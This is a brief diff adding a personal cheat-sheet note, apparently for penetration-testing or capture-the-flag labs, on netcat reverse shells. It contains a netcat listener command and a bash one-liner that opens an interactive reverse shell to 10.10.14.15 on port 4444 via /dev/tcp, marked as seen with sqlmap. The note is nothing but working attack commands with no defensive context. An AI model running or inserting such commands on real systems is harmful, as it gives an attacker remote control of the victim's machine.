@@ -1,0 +1,16 @@
+
+Netcat:
+
+Netcat Listener:
+nc -lvnp 4444
+
+
+
+
+Target box:
+
+With bash:
+(seen with sqlmap)
+bash -c 'bash -i >& /dev/tcp/10.10.14.15/4444 0>&1'
+
+
